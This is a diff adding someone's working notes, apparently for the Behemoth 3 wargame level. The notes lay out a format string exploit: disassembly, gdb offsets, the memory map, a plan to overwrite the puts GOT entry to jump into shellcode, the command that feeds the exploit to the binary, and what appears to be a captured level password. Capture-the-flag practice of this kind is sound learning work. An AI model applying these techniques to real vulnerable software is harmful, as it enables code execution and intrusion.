@@ -1,0 +1,107 @@
+Format string exploit probably
+
+/tmp/tmp.25v791Me8x
+
+Allocating 0xc8 or 200 for stack frame
+fgets limites to 0xc8 or 200 b
+
+Return address (with gdb) is at 0xffff d36c and is equal to 0xf7da1cb9
+
+Where is format stored? 0xffff d2a0 (with gdb) or ebp-0xc8
+                               d2b0 (with ltrace)
+Where is the return address stored? At %52$x
+
+<4 byte ret address>%n overwrites the return address
+
+Aim in middle of nop sleigh around d308
+
+TODO The expl works in gdb but does nothing outside. With an incorrect address
+to the shell-code it still exits cleanly meaning that we fail to overwrite the
+proper return code.
+
+
+
+shellcode is 58 bytes
+
+│           0x08049186      55             push ebp
+│           0x08049187      89e5           mov ebp, esp
+│           0x08049189      81ecc8000000   sub esp, 0xc8
+│           0x0804918f      6808a00408     push str.Identify_yourself: ; 0x804a008 ; "Identify yourself: "
+│           0x08049194      e8a7feffff     call sym.imp.printf         ; int printf(const char *format)
+│           0x08049199      83c404         add esp, 4
+│           0x0804919c      a140b20408     mov eax, dword [obj.stdin]  ; loc.__bss_start
+│                                                                      ; [0x804b240:4]=0
+│           0x080491a1      50             push eax                    ; FILE *stream
+│           0x080491a2      68c8000000     push 0xc8                   ; 200 ; int size
+│           0x080491a7      8d8538ffffff   lea eax, [format]
+│           0x080491ad      50             push eax                    ; char *s
+│           0x080491ae      e89dfeffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
+│           0x080491b3      83c40c         add esp, 0xc
+│           0x080491b6      681ca00408     push str.Welcome_           ; 0x804a01c ; "Welcome, "
+│           0x080491bb      e880feffff     call sym.imp.printf         ; int printf(const char *format)
+│           0x080491c0      83c404         add esp, 4
+│           0x080491c3      8d8538ffffff   lea eax, [format]
+│           0x080491c9      50             push eax                    ; const char *format
+│           0x080491ca      e871feffff     call sym.imp.printf         ; int printf(const char *format)
+│           0x080491cf      83c404         add esp, 4
+│           0x080491d2      6826a00408     push str._naaaand_goodbye_again. ; 0x804a026 ; "\naaaand goodbye again."
+│           0x080491d7      e884feffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x080491dc      83c404         add esp, 4
+│           0x080491df      b800000000     mov eax, 0
+│           0x080491e4      c9             leave
+└           0x080491e5      c3             ret
+
+Mapped address spaces:
+
+        Start Addr   End Addr       Size     Offset  Perms   objfile
+         0x8048000  0x8049000     0x1000        0x0  r--p   /behemoth/behemoth3
+         0x8049000  0x804a000     0x1000     0x1000  r-xp   /behemoth/behemoth3
+         0x804a000  0x804b000     0x1000     0x2000  r--p   /behemoth/behemoth3
+         0x804b000  0x804c000     0x1000     0x2000  rw-p   /behemoth/behemoth3
+        0xf7d7d000 0xf7da0000    0x23000        0x0  r--p   /usr/lib/i386-linux-gnu/libc.so.6
+        0xf7da0000 0xf7f27000   0x187000    0x23000  r-xp   /usr/lib/i386-linux-gnu/libc.so.6
+        0xf7f27000 0xf7fac000    0x85000   0x1aa000  r--p   /usr/lib/i386-linux-gnu/libc.so.6
+        0xf7fac000 0xf7fae000     0x2000   0x22f000  r--p   /usr/lib/i386-linux-gnu/libc.so.6
+        0xf7fae000 0xf7faf000     0x1000   0x231000  rw-p   /usr/lib/i386-linux-gnu/libc.so.6
+        0xf7faf000 0xf7fb9000     0xa000        0x0  rw-p
+        0xf7fc1000 0xf7fc3000     0x2000        0x0  rw-p
+        0xf7fc3000 0xf7fc5000     0x2000        0x0  r--p   [vvar]
+        0xf7fc5000 0xf7fc7000     0x2000        0x0  r--p   [vvar_vclock]
+        0xf7fc7000 0xf7fc9000     0x2000        0x0  r-xp   [vdso]
+        0xf7fc9000 0xf7fca000     0x1000        0x0  r--p   /usr/lib/i386-linux-gnu/ld-linux.so.2
+        0xf7fca000 0xf7fed000    0x23000     0x1000  r-xp   /usr/lib/i386-linux-gnu/ld-linux.so.2
+        0xf7fed000 0xf7ffb000     0xe000    0x24000  r--p   /usr/lib/i386-linux-gnu/ld-linux.so.2
+        0xf7ffb000 0xf7ffd000     0x2000    0x31000  r--p   /usr/lib/i386-linux-gnu/ld-linux.so.2
+        0xf7ffd000 0xf7ffe000     0x1000    0x33000  rw-p   /usr/lib/i386-linux-gnu/ld-linux.so.2
+        0xfffdd000 0xffffe000    0x21000        0x0  rwxp   [stack]
+
+Dump of assembler code for function puts@plt:
+=> 0x08049060 <+0>:     jmp    *0x804b218  # Notice the dereference!
+   0x08049066 <+6>:     push   $0x18
+   0x0804906b <+11>:    jmp    0x8049020
+
+(gdb) x /xw 0x804b218
+0x804b218 <puts@got.plt>:       0x08049066
+(
+
+$ objdump -R /behemoth/behemoth3
+
+/behemoth/behemoth3:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+0804b1fc R_386_GLOB_DAT    __gmon_start__@Base
+0804b240 R_386_COPY        stdin@GLIBC_2.0
+0804b20c R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.34
+0804b210 R_386_JUMP_SLOT   printf@GLIBC_2.0
+0804b214 R_386_JUMP_SLOT   fgets@GLIBC_2.0
+0804b218 R_386_JUMP_SLOT   puts@GLIBC_2.0
+
+Instead of overwriting the return address which is hard to determine outside of
+gdb, overwrite the relocation entry at 0x0804b218.
+
+cat addrReloc write nop60 sh >explReloc
+(cat explReloc; cat) | /behemoth/behemoth3
+
+hpjUdlG723
+
